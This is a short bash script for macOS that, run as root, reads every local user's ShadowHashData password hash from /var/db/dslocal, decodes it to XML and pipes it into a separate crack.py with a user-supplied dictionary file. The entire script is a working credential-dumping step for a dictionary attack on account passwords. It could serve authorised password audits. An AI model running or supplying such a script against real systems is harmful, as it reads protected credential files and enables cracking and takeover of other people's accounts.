#!/bin/bash


usage="$0 <dictionary file path>"
pat="^[0-9a-zA-Z ]{1,}\.plist"
xml_pat="^<\?xml.*"

if [[ $EUID -ne 0 ]]; then
	echo "Not running as root, you probably won't see any results."
fi

if [ $# -eq 0 ]; then
	echo "Missing argument: $usage"
	exit 1
fi

for f in /var/db/dslocal/nodes/Default/users/*
do
	basefile=$(basename $f)
	if [[ $basefile =~ $pat ]]; then 
		echo $basefile
		xml=$(defaults read $f ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o -)
		if [ $? -eq 0 ]; then
			if [[ $xml =~ $xml_pat ]]; then
				echo $xml | python crack.py "$1"
			fi	
		fi
	fi
done
